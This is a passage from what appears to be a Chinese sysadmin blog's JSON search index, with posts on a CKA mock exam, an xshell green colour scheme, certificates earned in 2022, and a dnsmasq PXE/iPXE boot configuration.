足足重新认证了三次，浪费40分钟。\u003c/p\u003e\n\u003cp\u003e最后都感觉要完蛋了，只剩下不到10分钟检查，结果还不错，考了90分。\u003c/p\u003e\n\u003cp\u003e有第一次考的可以联系我，我给你说一些必须注意的事项。\u003c/p\u003e\n\u003cp\u003e然后 CKA 有一个模拟考试，36小时时间，实际考试的环境跟模拟的完全不一样啊。\u003c/p\u003e\n\u003cp\u003e但是模拟如果你能过，那考试你一定能过，模拟的难度不低，相当高。\u003c/p\u003e\n\u003cp\u003e这就把模拟的题给放出来，供大家参考，非常有参考价值。\u003c/p\u003e\n\u003cp\u003e大家可以学到很多东西。\u003c/p\u003e\n\u003cp\u003e文件下载：\u003ca href=\"./cka.html\"\u003ecka.html\u003c/a\u003e 单html文件\u003c/p\u003e","title":"cka的模拟试题"},{"content":"其实一直用的终端软件是terminus，全终端可用，以前用 ubuntu，非常好用。\n现在换到新公司，用 Win10，也装了一个。\n一直到机房改造前，还都觉得行，但是机房改造需要收回核心交换机、路由器的权限，开终端 console 居然要收费会员，没办法，找老刘换回了免费的xshell 7。\nxshell的配色实在是受不了，还是喜欢绿色的字符界面。\n备份一个绿色的方案：\n[mycolor] text(bold)=e9e9e9 magenta(bold)=ff00ff text=00ff80 white(bold)=fdf6e3 green=80ff00 red(bold)=ff0000 green(bold)=3c5a38 black(bold)=808080 red=ff4500 blue=00bfff black=000000 blue(bold)=1e90ff yellow(bold)=ffff00 cyan(bold)=00ffff yellow=c0c000 magenta=c000c0 background=042028 white=c0c0c0 cyan=00c0c0 [Names] count=1 name0=mycolor 保存成 mycolor.xcs 文件，然后工具\u0026ndash;\u0026gt; 配色方案，导入即可：\n整体效果还是比较好的。\n是自己喜欢的样子，当然，字体从9也增加到了12。\n","permalink":"https://rendoumi.com/posts/20230112-xshell_colors/","summary":"\u003cp\u003e其实一直用的终端软件是terminus，全终端可用，以前用 ubuntu，非常好用。\u003c/p\u003e\n\u003cp\u003e现在换到新公司，用 Win10，也装了一个。\u003c/p\u003e\n\u003cp\u003e一直到机房改造前，还都觉得行，但是机房改造需要收回核心交换机、路由器的权限，开终端 console 居然要收费会员，没办法，找老刘换回了免费的xshell 7。\u003c/p\u003e\n\u003cp\u003exshell的配色实在是受不了，还是喜欢绿色的字符界面。\u003c/p\u003e\n\u003cp\u003e备份一个绿色的方案：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003emycolor\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etext\u003cspan class=\"o\"\u003e(\u003c/span\u003ebold\u003cspan class=\"o\"\u003e)=\u003c/span\u003ee9e9e9\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emagenta\u003cspan class=\"o\"\u003e(\u003c/span\u003ebold\u003cspan class=\"o\"\u003e)=\u003c/span\u003eff00ff\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003etext\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e00ff80\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewhite\u003cspan class=\"o\"\u003e(\u003c/span\u003ebold\u003cspan class=\"o\"\u003e)=\u003c/span\u003efdf6e3\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003egreen\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e80ff00\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ered\u003cspan class=\"o\"\u003e(\u003c/span\u003ebold\u003cspan class=\"o\"\u003e)=\u003c/span\u003eff0000\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egreen\u003cspan class=\"o\"\u003e(\u003c/span\u003ebold\u003cspan class=\"o\"\u003e)=\u003c/span\u003e3c5a38\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eblack\u003cspan class=\"o\"\u003e(\u003c/span\u003ebold\u003cspan class=\"o\"\u003e)=\u003c/span\u003e\u003cspan class=\"m\"\u003e808080\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003ered\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eff4500\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eblue\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e00bfff\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eblack\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e000000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eblue\u003cspan class=\"o\"\u003e(\u003c/span\u003ebold\u003cspan class=\"o\"\u003e)=\u003c/span\u003e1e90ff\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyellow\u003cspan class=\"o\"\u003e(\u003c/span\u003ebold\u003cspan class=\"o\"\u003e)=\u003c/span\u003effff00\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecyan\u003cspan class=\"o\"\u003e(\u003c/span\u003ebold\u003cspan class=\"o\"\u003e)=\u003c/span\u003e00ffff\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eyellow\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ec0c000\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003emagenta\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ec000c0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003ebackground\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e042028\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003ewhite\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ec0c0c0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003ecyan\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e00c0c0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003eNames\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003ecount\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003ename0\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003emycolor\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e保存成 mycolor.xcs 文件，然后工具\u0026ndash;\u0026gt; 配色方案，导入即可：\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20230112112243176\" loading=\"lazy\" src=\"/posts/20230112-xshell_colors/image-20230112112243176.png\"\u003e\u003c/p\u003e\n\u003cp\u003e整体效果还是比较好的。\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20230112112306637\" loading=\"lazy\" src=\"/posts/20230112-xshell_colors/image-20230112112306637.png\"\u003e\u003c/p\u003e\n\u003cp\u003e是自己喜欢的样子，当然，字体从9也增加到了12。\u003c/p\u003e","title":"xshell的绿色配色方案"},{"content":"2022年经过努力，考了4张证书，2023年继续努力奋斗\u0026hellip;\u0026hellip;\n阿里云的ACP证书：\nAWS的SAA-C03证书：\nK8S的CKA证书：\nK8S的CKS证书：\n","permalink":"https://rendoumi.com/posts/20230103-certificates/","summary":"\u003cp\u003e2022年经过努力，考了4张证书，2023年继续努力奋斗\u0026hellip;\u0026hellip;\u003c/p\u003e\n\u003cp\u003e阿里云的ACP证书：\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20230103121806291\" loading=\"lazy\" src=\"/posts/20230103-certificates/image-20230103121806291.png\"\u003e\u003c/p\u003e\n\u003cp\u003eAWS的SAA-C03证书：\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20230103121902909\" loading=\"lazy\" src=\"/posts/20230103-certificates/image-20230103121902909.png\"\u003e\u003c/p\u003e\n\u003cp\u003eK8S的CKA证书：\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20230103121954249\" loading=\"lazy\" src=\"/posts/20230103-certificates/image-20230103121954249.png\"\u003e\u003c/p\u003e\n\u003cp\u003eK8S的CKS证书：\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20230103122032231\" loading=\"lazy\" src=\"/posts/20230103-certificates/image-20230103122032231.png\"\u003e\u003c/p\u003e","title":"2022年获得的证书"},{"content":"DNSMASQ做局域网内的pxe installl是最合适不过的软件了。不用单独搭建 tftpserver，用自建的即可。\n而且支持给各种子网打标签，还可以按标签发送各种dhcp包的特定信息。\ninterface=eth0 bind-dynamic pxe-prompt=\u0026#34;Rendoumi PXE System\u0026#34;, 5 domain-needed bogus-priv no-resolv no-poll #address=/jump.dedi.jp/install/103.108.236.5 #UP Stream DNS Server server=114.114.114.114 server=202.106.196.115 server=202.106.0.20 strict-order dhcp-authoritative dhcp-sequential-ip dhcp-no-override log-facility=/var/log/dnsmasq.log log-dhcp log-queries enable-tftp tftp-root = /export/servers/tftpboot #only new add host is dynamic, delete or modify not. #dhcp-hostsfile=/etc/dhcp-host/hosts.conf dhcp-hostsdir=/etc/dhcp-host # #Setup different options for each of the unique subnets, since default gateways will be different #The format for this is: dhcp-options=\u0026lt;your_tags_here\u0026gt;,\u0026lt;option\u0026gt;,\u0026lt;option_value\u0026gt; - #3 is router #1:netmask, 15:domain-name, 3:router, 6:dns-server, #44:netbios-ns, 46:netbios-nodetype, 47:netbios-scope, #31:router-discovery, 33:static-route, 121:classless-static-route, #43:vendor-encap # dhcp-option=option:dns-server,172.18.30.1,172.18.30.2 dhcp-option=option:all-subnets-local,1 dhcp-option=option:T1,2m dhcp-option=option:T2,4m #dhcp-range=[tag:\u0026lt;tag\u0026gt;[,tag:\u0026lt;tag\u0026gt;],][set:\u0026lt;tag\u0026gt;,]\u0026lt;start-addr\u0026gt;[,\u0026lt;end-addr\u0026gt;|\u0026lt;mode\u0026gt;][,\u0026lt;netmask\u0026gt;[,\u0026lt;broadcast\u0026gt;]][,\u0026lt;lease time\u0026gt;] #vlan 1 native vlan #dhcp-range=set:net1,172.18.29.100,172.18.29.250,static,255.255.254.0,2m dhcp-range=set:net1,172.18.29.100,static,2m dhcp-option-force=tag:net1,option:router,172.18.29.254 #vlan 199 wuli #dhcp-range=set:net2,172.18.31.100,static,255.255.254.0,2m #dhcp-range=set:net2,172.18.31.100,255.255.254.0,2m dhcp-range=set:net2,172.18.31.100,static,2m dhcp-option-force=tag:net2,option:router,172.18.31.254 # set tag \u0026#34;ipxe\u0026#34; if request comes from iPXE (\u0026#34;iPXE\u0026#34; user class) dhcp-userclass=set:ipxe,iPXE # alternative way, look for option 175 #dhcp-match=set:ipxe,175 # gPXE/iPXE sends a 175 option. # if request comes from dumb firmware, send them iPXE (via TFTP) #dhcp-boot=tag:!ipxe,undionly.kpxe,boothost,172.18.29.2 dhcp-boot=tag:!ipxe,undionly.kpxe # if request comes from iPXE, direct it to boot from boot1.php #dhcp-boot=tag:ipxe,http://172.18.29.2/pxeboot/boot1.php #--dhcp-boot=[tag:\u0026lt;tag\u0026gt;,]\u0026lt;filename\u0026gt;,[\u0026lt;servername\u0026gt;[,\u0026lt;server address\u0026gt;|\u0026lt;tftp_servername\u0026gt;]] dhcp-boot=tag:ipxe,tag:net1,http://172.18.29.2/pxeboot/boot1.php,172.18.29.2 dhcp-boot=tag:ipxe,tag:net2,http://172.18.31.2/pxeboot/boot1.php,172.18.31.2 # Args add(old del) mac ip hostname # add ac:1f:6b:21:3e:d8 103.108.236.22 1403-s27 #dhcp-script=/bin/echo #dhcp-leasefile=/var/log/dnsmasq.leases # !!!! tag is alphanumeric label, fuck !!!!! 附上undionly.kpxe：undionly.kpxe\n","permalink":"https://rendoumi.com/posts/20221222-dnsmasq_pxe/","summary":"\u003cp\u003eDNSMASQ做局域网内的pxe installl是最合适不过的软件了。不用单独搭建 tftpserver，用自建的即可。\u003c/p\u003e\n\u003cp\u003e而且支持给各种子网打标签，还可以按标签发送各种dhcp包的特定信息。\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003einterface\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eeth0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ebind-dynamic\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epxe-prompt\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Rendoumi PXE System\u0026#34;\u003c/span\u003e, \u003cspan class=\"m\"\u003e5\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edomain-needed\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ebogus-priv\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eno-resolv\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eno-poll\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#address=/jump.dedi.jp/install/103.108.236.5\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#UP Stream DNS Server\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eserver\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e114.114.114.114\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eserver\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e202.106.196.115\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eserver\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e202.106.0.20\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003estrict-order\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edhcp-authoritative\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edhcp-sequential-ip\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edhcp-no-override\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elog-facility\u003cspan class=\"o\"\u003e=\u003c/span\u003e/var/log/dnsmasq.log\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elog-dhcp\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elog-queries\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eenable-tftp\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etftp-root \u003cspan class=\"o\"\u003e=\u003c/span\u003e /export/servers/tftpboot\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#only new add host is dynamic, delete or modify not.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#dhcp-hostsfile=/etc/dhcp-host/hosts.conf\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edhcp-hostsdir\u003cspan class=\"o\"\u003e=\u003c/span\u003e/etc/dhcp-host\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#Setup different options for each of the unique subnets, since default gateways will be different\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#The format for this is: dhcp-options=\u0026lt;your_tags_here\u0026gt;,\u0026lt;option\u0026gt;,\u0026lt;option_value\u0026gt; - \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#3 is router\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#1:netmask, 15:domain-name, 3:router, 6:dns-server,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#44:netbios-ns, 46:netbios-nodetype, 47:netbios-scope,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#31:router-discovery, 33:static-route, 121:classless-static-route,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#43:vendor-encap\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edhcp-option\u003cspan class=\"o\"\u003e=\u003c/span\u003eoption:dns-server,172.18.30.1,172.18.30.2\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edhcp-option\u003cspan class=\"o\"\u003e=\u003c/span\u003eoption:all-subnets-local,1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edhcp-option\u003cspan class=\"o\"\u003e=\u003c/span\u003eoption:T1,2m\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edhcp-option\u003cspan class=\"o\"\u003e=\u003c/span\u003eoption:T2,4m\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#dhcp-range=[tag:\u0026lt;tag\u0026gt;[,tag:\u0026lt;tag\u0026gt;],][set:\u0026lt;tag\u0026gt;,]\u0026lt;start-addr\u0026gt;[,\u0026lt;end-addr\u0026gt;|\u0026lt;mode\u0026gt;][,\u0026lt;netmask\u0026gt;[,\u0026lt;broadcast\u0026gt;]][,\u0026lt;lease time\u0026gt;]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#vlan 1 native vlan\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#dhcp-range=set:net1,172.18.29.100,172.18.29.250,static,255.255.254.0,2m\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edhcp-range\u003cspan class=\"o\"\u003e=\u003c/span\u003eset:net1,172.18.29.100,static,2m\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edhcp-option-force\u003cspan class=\"o\"\u003e=\u003c/span\u003etag:net1,option:router,172.18.29.254\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#vlan 199 wuli\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#dhcp-range=set:net2,172.18.31.100,static,255.255.254.0,2m\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#dhcp-range=set:net2,172.18.31.100,255.255.254.0,2m\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edhcp-range\u003cspan class=\"o\"\u003e=\u003c/span\u003eset:net2,172.18.31.100,static,2m\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edhcp-option-force\u003cspan class=\"o\"\u003e=\u003c/span\u003etag:net2,option:router,172.18.31.254\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# set tag \u0026#34;ipxe\u0026#34; if request comes from iPXE (\u0026#34;iPXE\u0026#34; user class)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edhcp-userclass\u003cspan class=\"o\"\u003e=\u003c/span\u003eset:ipxe,iPXE\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# alternative way, look for option 175\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#dhcp-match=set:ipxe,175 # gPXE/iPXE sends a 175 option.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# if request comes from dumb firmware, send them iPXE (via TFTP)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#dhcp-boot=tag:!ipxe,undionly.kpxe,boothost,172.18.29.2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edhcp-boot\u003cspan class=\"o\"\u003e=\u003c/span\u003etag:!ipxe,undionly.kpxe\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# if request comes from iPXE, direct it to boot from boot1.php\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#dhcp-boot=tag:ipxe,http://172.18.29.2/pxeboot/boot1.php\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#--dhcp-boot=[tag:\u0026lt;tag\u0026gt;,]\u0026lt;filename\u0026gt;,[\u0026lt;servername\u0026gt;[,\u0026lt;server address\u0026gt;|\u0026lt;tftp_servername\u0026gt;]]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edhcp-boot\u003cspan class=\"o\"\u003e=\u003c/span\u003etag:ipxe,tag:net1,http://172.18.29.2/pxeboot/boot1.php,172.18.29.2\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edhcp-boot\u003cspan class=\"o\"\u003e=\u003c/span\u003etag:ipxe,tag:net2,http://172.18.31.2/pxeboot/boot1.php,172.18.31.2\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Args add(old del) mac ip hostname\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# add ac:1f:6b:21:3e:d8 103.108.236.22 1403-s27\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#dhcp-script=/bin/echo\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#dhcp-leasefile=/var/log/dnsmasq.leases\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# !!!! tag is alphanumeric label, fuck 